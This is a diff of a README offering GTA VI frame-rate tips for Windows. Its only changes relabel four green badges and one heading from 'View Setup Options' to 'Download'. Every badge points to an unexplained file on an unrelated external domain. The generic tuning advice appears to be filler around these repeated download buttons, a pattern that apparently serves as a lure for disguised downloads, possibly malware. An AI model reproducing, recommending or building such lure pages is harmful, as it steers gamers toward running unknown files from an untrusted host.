@@ -1,7 +1,7 @@
 
 # Boost GTA VI frame rate on a Windows PC
 
-[![View Setup Options](https://img.shields.io/badge/View%20Setup%20Options-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
+[![Download](https://img.shields.io/badge/Download-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
 
 ## Fast GTA VI Frame Rate Brief
 
@@ -33,7 +33,7 @@ Readers weighing options usually compare a driver-level frame cap with the in-ga
 
 Keep one plain baseline configuration written down before you start. Without it, three changes later you cannot tell which one helped, and reverting means guessing.
 
-[![View Setup Options](https://img.shields.io/badge/View%20Setup%20Options-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
+[![Download](https://img.shields.io/badge/Download-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
 
 ## Getting Started Playbook
 
@@ -52,7 +52,7 @@ Scenario B - Downtown density: test a crowd-heavy street twice to separate simul
 Scenario C - Laptop on battery: repeat the route on mains power to see how much of the shortfall was power management  
 Scenario D - After a game patch: re-run the saved route before restoring an old settings file wholesale  
 
-[![View Setup Options](https://img.shields.io/badge/View%20Setup%20Options-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
+[![Download](https://img.shields.io/badge/Download-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
 
 ## Setup Checklist
 
@@ -65,11 +65,11 @@ Scenario D - After a game patch: re-run the saved route before restoring an old 
 | Monitoring tool | Choose one overlay for frametimes and load, and keep it on for every pass. |
 | Repeatable route | Write the route down, including time of day and district. |
 
-## View Setup Options
+## Download
 
 Open the setup page and review the options covered here. Check which constraints apply to the hardware you already have, then measure your own route before adopting a figure from someone else's machine.
 
-[![View Setup Options](https://img.shields.io/badge/View%20Setup%20Options-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
+[![Download](https://img.shields.io/badge/Download-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)
 
 ## Troubleshooting Common Issues
 
